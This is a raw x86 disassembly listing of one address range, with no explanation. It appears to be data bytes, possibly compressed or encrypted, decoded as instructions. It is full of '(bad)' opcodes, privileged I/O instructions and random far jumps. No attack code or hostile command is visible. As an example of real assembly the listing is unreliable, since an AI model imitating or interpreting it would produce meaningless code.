  415273:	add    bl,BYTE PTR [ebx-0x71]
  415276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415277:	addr16 dec esi
  415279:	fcom   DWORD PTR ds:0x850ce3d8
  41527f:	sbb    eax,0x5adfd094
  415284:	fwait
  415285:	or     BYTE PTR [ecx],0xd3
  415288:	xor    DWORD PTR [esp+ecx*1],eax
  41528b:	xchg   ebp,eax
  41528c:	out    dx,eax
  41528d:	push   ecx
  41528e:	icebp  
  41528f:	lods   al,BYTE PTR ds:[esi]
  415290:	jle    0x415308
  415292:	pop    ecx
  415293:	cld    
  415294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415295:	cmp    DWORD PTR [edi+edi*4],0xffffffe7
  415299:	pop    edi
  41529b:	ror    DWORD PTR [ebx],cl
  41529d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41529e:	mov    edi,0x36daf38c
  4152a3:	mov    bl,0x4e
  4152a5:	inc    ebp
  4152a6:	mov    BYTE PTR [edx],dh
  4152a8:	mov    bh,0x96
  4152aa:	dec    eax
  4152ab:	pop    eax
  4152ac:	pop    edx
  4152ad:	mov    ah,0x84
  4152af:	fsub   QWORD PTR [ecx+0x127341d4]
  4152b5:	fcomp  QWORD PTR [eax+0x24cc5d3e]
  4152bb:	cvtpi2ps xmm4,QWORD PTR [ebp-0x15bf8c5f]
  4152c2:	jmp    0xdb87:0xe4a10a93
  4152c9:	fldenv [edx+ebx*8-0x3c80c8c0]
  4152d0:	jmp    0xcb82:0x6c47d891
  4152d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d8:	xchg   edx,eax
  4152d9:	(bad)  
  4152da:	loop   0x41535a
  4152dc:	mov    al,0x91
  4152de:	xlat   BYTE PTR ds:[ebx]
  4152df:	lahf   
  4152e0:	sbb    al,0x18
  4152e2:	fucom  st(6)
  4152e4:	sub    DWORD PTR [ebx-0x62d003c2],eax
  4152ea:	cdq    
  4152eb:	data16 lock fst DWORD PTR gs:[ecx+0x4f5de6d7]
  4152f4:	test   eax,0x758bcf3a
  4152f9:	gs add al,0x1c
  4152fc:	rcl    BYTE PTR [esi-0x27],0x82
  415300:	inc    esi
  415301:	pop    es
  415302:	push   esp
  415303:	es js  0x41535a
  415306:	loope  0x415355
  415308:	stos   DWORD PTR es:[edi],eax
  415309:	dec    esi
  41530a:	rcr    BYTE PTR [eax+0x2f],cl
  41530d:	xchg   edi,eax
  41530e:	sahf   
  41530f:	rcr    DWORD PTR [ebp+0x3e663e99],cl
  415315:	jmp    0xc883aca
  41531a:	rcr    BYTE PTR [edx-0x6b72e1d5],cl
  415320:	(bad)  
  415321:	pushf  
  415322:	dec    esp
  415323:	fnstsw WORD PTR [esi+0x69736ef0]
  415329:	push   edi
  41532a:	iret   
  41532b:	pop    ebx
  41532c:	(bad)  
  41532d:	out    0x7f,eax
  41532f:	pushf  
  415330:	cdq    
  415331:	cmp    DWORD PTR [ecx+eax*8+0x2a],0x65
  415336:	enter  0x2a72,0x50
  41533a:	cmp    ecx,DWORD PTR [edi+0xa]
  41533d:	sub    ch,ah
  41533f:	scas   eax,DWORD PTR es:[edi]
  415340:	xor    al,0x43
  415342:	cs jp  0x415313
  415345:	sbb    cl,BYTE PTR [eax]
  415347:	ret    0x216d
  41534a:	xor    BYTE PTR [ecx-0x5966c004],ch
  415350:	xchg   ebp,eax
  415351:	enter  0x9bd4,0x38
  415355:	or     BYTE PTR [ebp+0x11f334f7],0x36
  41535c:	ins    DWORD PTR es:[edi],dx
  41535d:	push   ss
  41535e:	mov    DWORD PTR [eax-0x5d],esp
  415361:	es ins BYTE PTR es:[edi],dx
  415363:	(bad)  
  415365:	jnp    0x41533d
  415367:	push   esp
  415368:	ds pop esi
  41536a:	bound  ebp,QWORD PTR [esi]
  41536c:	sbb    dl,BYTE PTR [eax+0x46]
  41536f:	test   ebx,esi
  415371:	xchg   ebx,eax
  415372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415373:	push   ebx
  415374:	aam    0x9d
  415376:	push   eax
  415377:	sahf   
  415378:	icebp  
  415379:	cld    
  41537a:	inc    ebx
  41537b:	imul   edi,DWORD PTR [ebp+0x6c],0xffffffeb
  41537f:	cmp    bl,dl
  415381:	mov    BYTE PTR [ecx-0x6f10993b],0xb5
  415388:	jne    0x4153b7
  41538a:	cmp    DWORD PTR [esi-0xb3f028],eax
  415390:	pop    esi
  415391:	dec    esp
  415392:	mov    al,0x41
  415394:	cmc    
  415395:	adc    DWORD PTR [ecx],eax
  415397:	addr16 out 0xb2,al
  41539a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41539b:	rcr    cl,cl
  41539d:	mov    ah,0x3
  41539f:	popf   
  4153a0:	mov    ds:0x69a836c3,al
  4153a5:	hlt    
  4153a6:	leave  
  4153a7:	mov    ebp,0xbf160036
  4153ac:	add    eax,0xc3c2328
  4153b1:	popf   
  4153b2:	fadd   QWORD PTR [edx+ebp*8]
  4153b5:	lea    ecx,[ebx+ebp*2]
  4153b8:	xchg   ecx,eax
  4153b9:	xchg   edi,eax
  4153ba:	call   0x946e:0x7f8045df
  4153c1:	sub    eax,ecx
  4153c3:	(bad)  
  4153c4:	sub    eax,0x52ce5ba2
  4153c9:	lods   eax,DWORD PTR ds:[esi]
  4153ca:	mov    ds:0x1752540e,al
  4153cf:	adc    eax,0x3d0eef45
  4153d4:	jne    0x4153ca
  4153d6:	imul   edi,DWORD PTR [edi],0x12e38077
  4153dc:	add    BYTE PTR [esi+0x5c637343],bl
  4153e2:	mov    ds:0xdfb132,al
  4153e7:	dec    ecx
  4153e8:	scas   al,BYTE PTR es:[edi]
  4153e9:	jo     0x41542e
  4153eb:	mov    esi,esi
  4153ed:	int    0xe7
  4153ef:	fist   WORD PTR [ebp+0x75]
  4153f2:	lock sbb al,0xf5
  4153f5:	xor    eax,0x4d606cfc
  4153fa:	test   esp,ebx
  4153fc:	gs add al,0x25
  4153ff:	jno    0x415403
  415401:	mov    ds:0x92e91a4e,al
  415406:	inc    edx
  415407:	sub    eax,0x3109b24
  41540c:	mov    esi,0x9f796f88
  415411:	out    0x1,al
  415413:	add    edi,DWORD PTR [ebp+ebp*1-0x5fe64f1b]
  41541a:	lds    ebp,FWORD PTR [esi-0x7c]
  41541d:	and    DWORD PTR [edi+edi*1+0x18],edi
  415421:	cld    
  415422:	sahf   
  415423:	xchg   edx,eax
  415424:	sub    BYTE PTR [ebx+0x8c3cd0d],al
  41542a:	mov    ss,edx
  41542c:	mov    ecx,0x8b68f823
  415431:	fs jmp 0xed210c8f
  415437:	mov    al,0x60
  415439:	pop    ds
  41543a:	xchg   BYTE PTR [edi-0xd],ah
  41543d:	cmp    DWORD PTR ss:[edx-0x39],esi
  415441:	inc    ebx
  415442:	loopne 0x41545b
  415444:	xchg   DWORD PTR [edi],ecx
  415446:	mov    edi,0x61ba4916
  41544b:	aaa    
  41544c:	push   0xfd3e7839
  415451:	and    edx,DWORD PTR [ecx-0x28245d46]
  415457:	(bad)  
  415458:	retf   0xca0a
  41545b:	les    edx,FWORD PTR [esi-0x6c3329b2]
  415461:	sbb    esi,eax
  415463:	scas   al,BYTE PTR es:[edi]
  415464:	mov    cl,0x72
  415466:	data16 into 
  415468:	sbb    DWORD PTR [esi-0x53],0x761d20dc
  41546f:	imul   esi,esp,0xfffffff1
  415472:	push   ebx
  415473:	(bad)  
  415474:	push   0x98d76ddf
  415479:	fist   DWORD PTR [ecx+0x366e809b]
  41547f:	ret    0xe283
  415482:	and    DWORD PTR fs:[ebx-0x40],ecx
  415486:	popa   
  415487:	xchg   ebp,eax
  415488:	xor    al,0xaf
  41548a:	test   al,0x30
  41548c:	je     0x4154d4
  41548e:	xchg   BYTE PTR [edx+edi*1-0x263c4cb0],dl
  415495:	inc    ebp
  415496:	push   0x74
  415498:	pop    ebp
  415499:	mov    esi,ecx
  41549b:	pop    edx
  41549c:	hlt    
  41549d:	jo     0x41545b
  41549f:	dec    edi
  4154a0:	outs   dx,BYTE PTR ds:[esi]
  4154a1:	or     DWORD PTR [ebp+0x4a77adf8],ecx
  4154a7:	jo     0x415504
  4154a9:	sbb    DWORD PTR [edx-0x148c29ed],ebx
  4154af:	imul   DWORD PTR [edi-0x4d7f0837]
  4154b5:	fs pop esp
  4154b7:	in     eax,0xd9
  4154b9:	or     BYTE PTR [eax+0xb],0x70
  4154bd:	add    al,0x51
  4154bf:	loope  0x415488
  4154c1:	fisubr WORD PTR [ebx]
  4154c3:	xor    eax,0xb0a2bb41
  4154c8:	sbb    ch,BYTE PTR [edx+0x62]
  4154cb:	bnd jne 0x4154df
  4154ce:	push   ds
  4154cf:	(bad)  
  4154d0:	lahf   
  4154d1:	ds xchg esi,eax
  4154d3:	les    edx,FWORD PTR [edi-0x49]
  4154d6:	imul   esp,DWORD PTR [eax+ecx*4+0x60],0x1a
  4154db:	out    0x13,eax
  4154dd:	out    dx,al
  4154de:	cld    
  4154df:	repz lea edx,[ebx-0x4b7d66d7]
  4154e6:	imul   BYTE PTR [edi+0x38]
  4154e9:	loop   0x4154e5
  4154eb:	mov    esi,0x60c02136
  4154f0:	das    
  4154f1:	and    cl,ah
  4154f3:	mov    dl,0x4b
  4154f5:	pusha  
  4154f6:	fcmovbe st,st(6)
  4154f8:	mov    ch,BYTE PTR [eax]
  4154fa:	mov    DWORD PTR [esi+edi*1],esi
  4154fd:	mov    esp,0x75cc2773
  415502:	test   al,0x3b
  415504:	push   eax
  415505:	adc    DWORD PTR [edi-0x4d],eax
  415508:	pop    ecx
  415509:	shr    DWORD PTR [ecx],1
  41550b:	es mov ebp,0xc327f400
  415511:	lods   eax,DWORD PTR ds:[esi]
  415512:	jle    0x4154e4
  415514:	sbb    al,0x80
  415516:	fild   WORD PTR [edi]
  415518:	fistp  WORD PTR [edi-0x6d89725d]
  41551e:	std    
  41551f:	dec    eax
  415520:	out    dx,eax
  415521:	sbb    al,0xf5
  415523:	loop   0x41555d
  415525:	jnp    0x41552d
  415527:	retf   0xe2d
  41552a:	cmc    
  41552b:	jmp    0xf410:0x2aa448bc
  415532:	loop   0x4154b8
  415534:	jmp    0x4c14:0xcc762317
  41553b:	(bad)  
  41553c:	rol    ebp,cl
  41553e:	int3   
  41553f:	xchg   BYTE PTR [ebx+ebp*4],dl
  415542:	dec    ecx
  415543:	les    edi,FWORD PTR [esi]
  415545:	into   
  415546:	push   ebp
  415547:	js     0x415521
  415549:	pop    edx
  41554a:	jmp    0x4c4adeff
  41554f:	cmp    al,0x72
  415551:	lods   eax,DWORD PTR ds:[esi]
  415552:	shr    dh,0x7c
  415555:	sti    
  415556:	mov    ebx,0xfce7afed
  41555b:	and    DWORD PTR [edx],ebx
  41555d:	cs xor al,0x20
  415560:	jnp    0x415558
  415562:	out    dx,al
  415563:	xor    eax,0x55f2b56c
  415568:	and    DWORD PTR [esi-0x2f],esi
  41556b:	iret   
  41556c:	stos   DWORD PTR es:[edi],eax
  41556d:	(bad)  
  41556e:	test   eax,0x4b29fe45
  415573:	inc    edx
  415574:	and    BYTE PTR [edi+eiz*2+0x64f7b6f7],ah
  41557b:	lds    esi,FWORD PTR [eax-0x5b]
  41557e:	loop   0x4155d9
  415580:	fnstcw WORD PTR [ebp+0x2202211e]
  415586:	fcmovnbe st,st(5)
  415588:	mov    ah,0xdf
  41558a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41558b:	adc    al,0x20
  41558d:	outs   dx,BYTE PTR ds:[esi]
  41558e:	pop    esp
  41558f:	add    al,0xe6
  415591:	inc    ecx
  415592:	aaa    
  415593:	push   esi
  415594:	dec    ebp
  415595:	inc    esp
  415596:	retf   
  415597:	xchg   ecx,eax
  415598:	inc    ecx
  415599:	call   FWORD PTR [edi+ecx*8]
  41559c:	mov    al,0x17
  41559e:	sahf   
  41559f:	pop    ebx
  4155a0:	push   edx
  4155a1:	div    BYTE PTR [ebx+edx*2+0x11]
  4155a5:	adc    al,0xb9
  4155a7:	mov    BYTE PTR [ecx-0x7],dl
  4155aa:	pop    edi
  4155ab:	jp     0x41555e
  4155ad:	or     cl,BYTE PTR [ebp-0x470f6635]
  4155b3:	aad    0xbe
  4155b5:	jns    0x41558e
  4155b7:	jmp    0x73b8e8fb
  4155bc:	inc    esp
  4155bd:	(bad)  
  4155be:	stos   BYTE PTR es:[edi],al
  4155bf:	mov    edx,0x5f1396c8
  4155c4:	shr    dl,1
  4155c6:	cmp    DWORD PTR [edi],esi
  4155c8:	mov    al,0xe0
  4155ca:	mov    eax,ds:0xa33455c4
  4155cf:	sub    BYTE PTR [ebx],ch
  4155d1:	inc    ecx
  4155d2:	cmc    
  4155d3:	clc    
  4155d4:	sub    edi,DWORD PTR ds:0xd3a15258
  4155da:	shl    BYTE PTR [ecx],1
  4155dc:	mov    ch,0x4f
  4155de:	sub    BYTE PTR [ebx+edx*8-0x140f4aa6],dl
  4155e5:	inc    edi
  4155e6:	pop    DWORD PTR [ebp+edx*1-0x7c]
  4155ea:	mov    esp,DWORD PTR [eax-0x38927832]
  4155f0:	push   0x75
  4155f2:	or     ecx,eax
  4155f4:	ret    0x5122
  4155f7:	pop    ebp
  4155f8:	push   ebx
  4155f9:	xlat   BYTE PTR ds:[ebx]
  4155fa:	xchg   DWORD PTR cs:[ebp-0x17],ecx
  4155fe:	sub    BYTE PTR [ecx+0x2b],ah
  415601:	mov    eax,DWORD PTR [esi-0x718255b1]
  415607:	daa    
  415608:	in     eax,0x69
  41560a:	bound  ebx,QWORD PTR [ebx-0x77255caf]
  415610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415611:	cli    
  415612:	push   cs
  415613:	aaa    
  415614:	lods   eax,DWORD PTR ds:[esi]
  415615:	clc    
  415616:	shl    bh,0x87
  415619:	xchg   edi,eax
  41561a:	in     eax,0x56
  41561c:	and    DWORD PTR [ebx-0x67eadb97],esi
  415622:	xor    al,0x11
  415624:	shl    DWORD PTR [ecx-0x70],cl
  415627:	(bad)  
  415629:	sbb    eax,0x3d5e77e7
  41562e:	and    eax,0xd8935095
  415633:	inc    edx
  415634:	bound  ecx,QWORD PTR [eax]
  415636:	jne    0x4155be
  415638:	pop    es
  415639:	and    BYTE PTR ds:0xbad66009,0x1a
  415640:	ins    DWORD PTR es:[edi],dx
  415641:	push   edx
  415642:	xchg   ebp,eax
  415643:	in     eax,0x16
  415645:	ret    
  415646:	cli    
  415647:	and    eax,0x768adb8d
  41564c:	pop    eax
  41564d:	sub    eax,0xb7fc8a0d
  415652:	shr    BYTE PTR [eax],0xbb
  415655:	mov    esi,0xfc0c291f
  41565a:	mov    ebx,0x8ff19cf1
  41565f:	jne    0x415634
  415661:	loop   0x4155ee
  415663:	(bad)  
  415665:	int3   
  415666:	in     al,dx
  415667:	out    dx,eax
  415668:	cmp    DWORD PTR [edx],eax
  41566a:	sbb    dl,BYTE PTR [eax+eax*8]
  41566d:	xchg   edi,eax
  41566e:	scas   eax,DWORD PTR es:[edi]
  41566f:	hlt    
  415670:	in     al,dx
  415671:	(bad)
  415675:	cs or  eax,0xb73136
  41567b:	add    esi,edi
  41567d:	mov    ds:0xe8b83c5d,al
  415682:	xchg   esp,eax
  415683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415684:	out    dx,al
  415685:	and    eax,0x9df72fb4
  41568a:	rcl    BYTE PTR [ebx+0x74],cl
  41568d:	push   ecx
  41568e:	dec    ecx
  41568f:	popf   
  415690:	fnstsw WORD PTR [bp+si]
  415693:	ja     0x415659
  415695:	cld    
  415696:	shr    BYTE PTR [ecx+0x1b],cl
  415699:	mov    fs,WORD PTR [ebp+0x5a31cb90]
  41569f:	or     bl,BYTE PTR [esp+ebx*2+0x453330fa]
  4156a6:	xor    BYTE PTR [ebx-0x5b],dl
  4156a9:	xchg   cl,cl
  4156ab:	imul   edx,DWORD PTR [eax+0x3d],0x32761255
  4156b2:	scas   al,BYTE PTR es:[edi]
  4156b3:	add    eax,0x9c5e8a20
  4156b8:	xor    BYTE PTR [edi],0x92
  4156bb:	inc    ecx
  4156bc:	pusha  
  4156bd:	jnp    0x4156f5
  4156bf:	(bad)  
  4156c0:	xchg   edi,eax
  4156c1:	leave  
  4156c2:	sbb    ecx,esp
  4156c4:	test   DWORD PTR [edx],eax
  4156c6:	nop
  4156c7:	(bad)  
  4156c8:	add    al,0x12
  4156ca:	jg     0x415731
  4156cc:	mov    ah,0xe6
  4156ce:	out    dx,al
  4156cf:	and    ebx,DWORD PTR [edx]
  4156d1:	jne    0x415712
  4156d3:	xchg   DWORD PTR [edi],ebp
  4156d5:	jae    0x41573a
  4156d7:	call   0xb72e:0x3d774d4a
  4156de:	das    
  4156df:	fwait
  4156e0:	ins    BYTE PTR es:[edi],dx
  4156e1:	xor    BYTE PTR [ecx],ah
  4156e3:	inc    edx
  4156e4:	loop   0x415673
  4156e6:	jae    0x4156bb
  4156e8:	xchg   ebp,eax
  4156e9:	aad    0x1e
  4156eb:	call   0xc2786710
  4156f0:	adc    al,0x14
  4156f2:	enter  0xa8fa,0x2
  4156f6:	loop   0x41569b
  4156f8:	daa    
  4156f9:	mov    bh,0x42
  4156fb:	and    dl,BYTE PTR [edi]
  4156fd:	and    DWORD PTR [esi+0x14ad2bd2],edx
  415703:	sti    
  415704:	adc    DWORD PTR [eax-0x5a174f28],ebp
  41570a:	aaa    
  41570b:	adc    al,0x3e
  41570d:	xchg   BYTE PTR [ebx-0x2dbf8f7f],bh
  415713:	cld    
  415714:	dec    edx
  415715:	shl    BYTE PTR [edx-0x321e499f],cl
  41571b:	or     cl,al
  41571d:	cld    
  41571e:	dec    ebx
  41571f:	and    DWORD PTR [edx+0x3fefb594],edx
  415725:	fwait
  415726:	xchg   ecx,eax
  415727:	call   0xcd7c:0xe24793d
  41572e:	clc    
  41572f:	push   es
  415730:	xor    al,BYTE PTR [edx]
  415732:	ins    DWORD PTR es:[edi],dx
  415733:	dec    ebp
  415734:	jae    0x4156f4
  415736:	inc    esi
  415737:	arpl   WORD PTR [ebx-0x324bd9f8],di
  41573d:	iret   
  41573e:	test   al,0x98
  415740:	stc    
  415741:	xchg   edi,eax
  415742:	push   esp
  415743:	loope  0x415703
  415745:	ss pop es
  415747:	push   es
  415748:	adc    DWORD PTR [edx+0x5c],0xa6fa553b
  41574f:	pop    esi
  415750:	inc    esp
  415751:	sub    eax,DWORD PTR [edi+0x5728c6c1]
  415757:	inc    edx
  415758:	mov    ebp,0x418552d
  41575d:	xchg   BYTE PTR [edi+0x61],ch
  415760:	ret    0xe7b5
  415763:	or     dh,BYTE PTR [eax]
  415765:	pop    edx
  415766:	and    al,0xf9
  415768:	push   cs
  415769:	lea    esp,[esi-0x23]
  41576c:	fld    QWORD PTR [edi-0x788ad6b3]
  415772:	pop    ds
  415773:	pop    ebp
  415774:	mov    esi,0xfd4b1806
  415779:	xchg   ebx,eax
  41577a:	inc    esi
  41577b:	jl     0x415754
  41577d:	jb     0x4157e4
  41577f:	add    ebp,edi
  415781:	inc    ecx
  415782:	or     BYTE PTR [ebx+0x72],dl
  415785:	jmp    0x1ec63430
  41578a:	aam    0xcf
  41578c:	mov    bh,0xc9
  41578e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41578f:	mov    ds:0x55c2eda5,al
  415794:	in     al,dx
  415795:	or     al,0xe4
  415797:	dec    esp
  415798:	inc    ebp
  415799:	call   0xacda:0xf482ff1c
  4157a0:	mov    db7,esi
  4157a3:	cmp    ch,bl
  4157a5:	call   0x8ba6:0xb6073ca5
  4157ac:	fst    QWORD PTR [eax+0x6a]
  4157af:	mov    cl,0x90
  4157b1:	repz mov al,0x8e
  4157b4:	ror    BYTE PTR [edx+0x522b2df3],1
  4157ba:	arpl   WORD PTR [edi],dx
  4157bc:	sbb    DWORD PTR [ebx],eax
  4157be:	mov    fs:0xf4fd6199,al
  4157c4:	lea    esi,[ebp-0x3b618381]
  4157ca:	int3   
  4157cb:	mov    cs,WORD PTR [eax]
  4157cd:	adc    BYTE PTR [ecx+0x7a48a927],0xdb
  4157d4:	cdq    
  4157d5:	inc    edi
  4157d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157d7:	stos   DWORD PTR es:[edi],eax
  4157d8:	int3   
  4157d9:	or     al,0x2c
  4157db:	cmp    BYTE PTR [ebx],ch
  4157dd:	dec    eax
  4157de:	inc    esi
  4157e0:	sar    BYTE PTR [edi+ebx*2],1
  4157e3:	xlat   BYTE PTR ds:[ebx]
  4157e4:	xor    esi,edx
  4157e6:	push   cs
  4157e7:	js     0x4157d9
  4157e9:	xor    DWORD PTR ds:0xdf91a9ae,esi
  4157ef:	gs push 0xd50ccd0c
  4157f5:	lahf   
  4157f6:	mov    dl,0x6b
  4157f8:	or     ebp,esp
  4157fa:	test   DWORD PTR [ecx],esi
  4157fc:	push   esi
  4157fd:	adc    edx,DWORD PTR [ebp+0x13a340a8]
  415803:	inc    edi
  415804:	inc    ebp
  415805:	mov    cl,0x8d
  415807:	push   ecx
  415808:	mov    DWORD PTR ss:[eax],edi
  41580b:	ret    
  41580c:	mov    edx,0x34ae161a
  415811:	das    
  415812:	(bad)  
  415813:	cmp    eax,0xd23044e7
  415818:	or     al,0xeb
  41581a:	or     eax,eax
  41581c:	arpl   WORD PTR [edi-0x32addd91],si
  415822:	push   edx
  415823:	in     eax,0xfd
  415825:	xor    al,0x12
  415827:	fldcw  WORD PTR [ebp+esi*4+0x79b4f4c4]
  41582e:	adc    BYTE PTR [ebp+0x18],ah
  415831:	fsub   DWORD PTR [esi-0x42]
  415834:	xchg   esp,eax
  415835:	xlat   BYTE PTR ds:[ebx]
  415836:	add    edi,eax
  415838:	add    DWORD PTR [ecx],ebp
  41583a:	cmp    BYTE PTR [eax-0xc015b6f],bl
  415840:	sub    DWORD PTR [eax],ebx
  415842:	mov    DWORD PTR [esi+0x6b],edi
  415845:	js     0x415801
  415847:	call   0xda319aea
  41584c:	(bad)  
  41584d:	xlat   BYTE PTR ds:[ebx]
  41584e:	sbb    esi,ebp
  415850:	bound  edi,QWORD PTR [edi+0x2]
  415853:	push   edx
  415854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415855:	sbb    ah,dl
  415857:	aam    0x85
  415859:	repnz pop esi
  41585b:	mov    eax,0xa137ad97
  415860:	push   es
  415861:	retf   
  415862:	and    ebp,DWORD PTR [ecx-0x45]
  415865:	jnp    0x4158c3
  415867:	cmp    dh,BYTE PTR [ebp-0xc75e6a3]
  41586d:	dec    esi
  41586e:	(bad)  
  41586f:	pop    ss
  415870:	iret   
  415871:	imul   edx,esi,0xa2894725
  415877:	xlat   BYTE PTR ds:[ebx]
  415878:	or     dl,BYTE PTR [ebp+0x30]
  41587b:	push   cs
  41587c:	mov    cl,BYTE PTR [ebx-0xb]
  41587f:	dec    esi
  415880:	retf   
  415881:	ficomp DWORD PTR [esi-0x65bea5c1]
  415887:	mov    ebx,0xf38bcba6
  41588c:	scas   eax,DWORD PTR es:[edi]
  41588d:	jge    0x41585c
  41588f:	fst    DWORD PTR [eax]
  415891:	gs mov eax,0xe2fb2ef6
  415897:	sub    DWORD PTR [ebx-0x4e1f382],esi
  41589d:	and    al,0xdb
  41589f:	mov    bl,0x19
  4158a1:	dec    esp
  4158a2:	int    0x3e
  4158a4:	sahf   
  4158a5:	xchg   edi,eax
  4158a6:	fisubr DWORD PTR [edx]
  4158a8:	nop
  4158a9:	adc    ah,BYTE PTR [ebp+0x11]
  4158ac:	xlat   BYTE PTR ds:[ebx]
  4158ad:	imul   edi,ebx,0x1
  4158b0:	mov    eax,0xc7aff89d
  4158b5:	pop    esi
  4158b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158b7:	xchg   ecx,eax
  4158b8:	stc    
  4158b9:	mov    al,ds:0xbb9ffe36
  4158be:	(bad)  
  4158bf:	in     al,0xb3
  4158c1:	jns    0x415888
  4158c3:	fcom   DWORD PTR [edi]
  4158c5:	rcl    BYTE PTR [ebx],cl
  4158c7:	jmp    0x41587b
  4158c9:	adc    dh,BYTE PTR [ebp+0x4be8a2c5]
  4158cf:	xchg   DWORD PTR [ebp-0x74],esi
  4158d2:	sbb    esp,edi
  4158d4:	jne    0x41586c
  4158d6:	xchg   esi,eax
  4158d7:	shl    BYTE PTR [edi-0x170227b4],cl
  4158dd:	dec    ebp
  4158de:	adc    dl,bl
  4158e0:	in     al,dx
  4158e1:	mov    bl,0xa3
  4158e3:	dec    edi
  4158e4:	mov    ebx,0x275739a4
  4158e9:	iret   
  4158ea:	or     ebp,DWORD PTR [ecx-0x2002df78]
  4158f0:	cmp    ecx,edi
  4158f2:	pop    edi
  4158f3:	jl     0x415875
  4158f5:	xor    eax,0x3b6ea8af
  4158fa:	jnp    0x4158fa
  4158fc:	xchg   ecx,eax
  4158fd:	icebp  
  4158fe:	ins    DWORD PTR es:[edi],dx
  4158ff:	jae    0x4158ee
  415901:	mov    eax,ds:0xe905597b
  415906:	sub    eax,0x50ec018c
  41590b:	rcr    DWORD PTR [edx],cl
  41590d:	shl    BYTE PTR [ebx],1
  41590f:	fidivr DWORD PTR [edi*2-0xc551812]
  415916:	ins    BYTE PTR es:[edi],dx
  415917:	enter  0xb5ac,0x81
  41591b:	lods   eax,DWORD PTR ds:[esi]
  41591c:	clc    
  41591d:	add    eax,0x79ff95ae
  415922:	pop    edx
  415923:	(bad)  
  415924:	leave  
  415925:	pop    ecx
  415926:	gs add eax,0x72919ed7
  41592c:	mov    es,edx
  41592e:	xor    edi,esi
  415930:	jae    0x415982
  415932:	sub    BYTE PTR [ecx+0x15f322fb],dh
  415938:	dec    BYTE PTR [eax]
  41593a:	fwait
  41593b:	jbe    0x41597e
  41593d:	popf   
  41593e:	lea    ebx,[edx]
  415940:	iret   
  415941:	or     DWORD PTR [edx+0x3d],ebp
  415944:	pop    esp
  415945:	or     al,BYTE PTR [ebx]
  415947:	adc    DWORD PTR [edi+0x7a],ebx
  41594a:	sub    eax,0xe8e9b48b
  41594f:	mov    dl,0x49
  415951:	add    DWORD PTR [esi],edx
  415953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415954:	jns    0x41596d
  415956:	push   ecx
  415957:	lahf   
  415958:	je     0x415999
  41595a:	inc    esp
  41595b:	inc    ebx
  41595c:	cli    
  41595d:	fadd   QWORD PTR [ebp+0x5d]
  415960:	into   
  415961:	ds jmp 0xb475d1c8
  415967:	pusha  
  415968:	jae    0x4159c8
  41596a:	mov    ebx,0x3bb2a72
  41596f:	pushf  
  415970:	xor    dh,dh
  415972:	outs   dx,DWORD PTR ds:[esi]
  415973:	mov    edx,esi
  415975:	mov    bh,0xdb
  415977:	sub    al,0x65
  415979:	cmc    
  41597a:	pop    edi
  41597b:	into   
  41597c:	pusha  
  41597d:	jns    0x41597a
  41597f:	retf   
  415980:	jbe    0x4159c1
  415982:	pop    ds
  415983:	xchg   esi,eax
  415984:	mov    ah,0x85
  415986:	add    BYTE PTR [eax+0x376d07d7],0x28
  41598d:	push   0x7cbe8800
  415992:	xchg   DWORD PTR [edx+0x36],ecx
  415995:	(bad)  
  415996:	push   esp
  415997:	jge    0x415a14
  415999:	jb     0x4159c7
  41599b:	push   0x10
  41599d:	out    dx,eax
  41599e:	aas    
  41599f:	or     eax,0xffffff80
  4159a2:	dec    esp
  4159a3:	jge    0x415a05
  4159a5:	push   eax
  4159a6:	imul   edi,DWORD PTR ds:0xb843e7fd,0x10
  4159ad:	call   0xbe0b8eb8
  4159b2:	add    bh,al
  4159b4:	fs dec edx
  4159b6:	pop    ss
  4159b7:	ins    DWORD PTR es:[edi],dx
  4159b8:	pop    ss
  4159b9:	sub    dl,bl
  4159bb:	push   es
  4159bc:	xchg   edi,eax
  4159bd:	jo     0x41596d
  4159bf:	dec    esp
  4159c0:	adc    ah,BYTE PTR [edx-0x17e7e8f2]
  4159c6:	xor    al,0x75
  4159c8:	mov    esp,DWORD PTR [esi]
  4159ca:	test   ebp,ebp
  4159cc:	daa    
  4159cd:	test   BYTE PTR [eax],0x82
  4159d0:	sub    ebx,eax
  4159d2:	xor    DWORD PTR [esi+eax*1+0x13],edx
  4159d6:	sbb    dl,BYTE PTR [eax]
  4159d8:	fstp   DWORD PTR [edx]
  4159da:	into   
  4159db:	and    BYTE PTR [ecx],0xbc
  4159de:	fisttp DWORD PTR [eax+0x26]
  4159e1:	inc    esp
  4159e2:	fwait
  4159e3:	sbb    ah,BYTE PTR [edi-0x3c67a27b]
  4159e9:	enter  0x7228,0x90
  4159ed:	cmp    edx,DWORD PTR [ebp-0x19]
  4159f0:	push   ebx
  4159f1:	cmp    edi,DWORD PTR [esi-0x1fdf48b4]
  4159f7:	jo     0x4159bc
  4159f9:	mov    eax,ds:0xf4891dbe
  4159fe:	mov    dh,cl
  415a00:	xor    eax,0xcf8f0c08
  415a05:	pop    ebp
  415a06:	pushf  
  415a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a08:	fsub   QWORD PTR ds:0x84c38afa
  415a0e:	and    al,0xf7
  415a10:	adc    al,0x63
  415a12:	test   DWORD PTR [edi],0x2cdd06c
  415a18:	retf   
  415a19:	mov    esp,0x78cf1bfb
  415a1e:	call   0xd446:0xa7ebfe1b
  415a25:	stc    
  415a26:	out    dx,al
  415a27:	pop    ecx
  415a28:	icebp  
  415a29:	test   eax,0x152f6d05
  415a2e:	(bad)  
  415a2f:	mov    BYTE PTR [edi-0x694c56cb],al
  415a35:	les    esi,FWORD PTR [ecx-0x51a05729]
  415a3b:	mov    al,ds:0xb281eea8
  415a40:	push   ds
  415a41:	fcmovnbe st,st(6)
